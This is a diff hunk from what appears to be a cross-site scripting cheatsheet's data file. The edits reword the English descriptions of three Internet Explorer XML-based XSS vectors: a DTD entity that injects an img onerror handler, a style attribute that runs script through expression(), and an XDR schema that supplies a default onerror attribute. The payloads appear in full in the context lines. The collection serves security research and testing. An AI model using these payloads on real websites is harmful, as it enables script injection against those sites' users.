@@ -2562,7 +2562,7 @@ var items =
             'raw'           : '<!ENTITY x "&#x3C;html:img&#x20;src=\'x\'&#x20;xmlns:html=\'http://www.w3.org/1999/xhtml\'&#x20;onerror=\'%js_alert%\'/&#x3E;">'
         },
         'description': {
-            'en' : 'IE requires to display html-tags of any users stylesheet and namespace prefix "html".',
+            'en' : 'IE will render doctype-provided entities in the "html" namespace as soon as a user defined XML stylesheet tag is present.',
             'ja' : '',
             'ru' : 'IE для отображения HTML-тегов требует обязательного наличия на xml-странице пользовательской таблицы стилей, а также объявления соответствующего пространства имен с префиксом "html".',
             'cs' : '',
@@ -2594,7 +2594,7 @@ var items =
         },
         'data'       : '<?xml-stylesheet type="text/css"?><root style="x:expression(%js_write%)"/>',
         'description': {
-            'en' : 'IE supports the style attribute to the xml-pages. So JavaScript can be executed in any tag.',
+            'en' : 'IE supports the style attribute in xml-pages too. Thus JavaScript can be executed via expression() with any given tag.',
             'ja' : '',
             'ru' : 'IE поддерживает стилевой атрибут на xml-страницах. Таким образом javascript может быть выполнен в любом теге.',
             'cs' : '',
@@ -2633,7 +2633,7 @@ var items =
             'raw'           : '<?xml version="1.0"?>\n<Schema name="x" xmlns="urn:schemas-microsoft-com:xml-data">\n<ElementType name="img">\n<AttributeType name="src" required="yes" default="x"/>\n<AttributeType name="onerror" required="yes" default="%js_alert%"/>\n<attribute type="src"/>\n<attribute type="onerror"/>\n</ElementType>\n</Schema>'
         },
         'description': {
-            'en' : 'The namespace "html" is automatically determined using XSL. Missing attributes for the <img> tag is obtained from the XDR-schema.',
+            'en' : 'The namespace "html" is automatically determined using XSL. Missing attributes for the <img> tag such as "onerror" are obtained from the XDR-schema - and will then execute JavaScript.',
             'ja' : '',
             'ru' : 'Пространство имен html автоматически определяется IE с помощью XSL-таблицы. Недостающие атрибуты для тега <img> заимствуются из XDR-схемы.',
             'cs' : '',
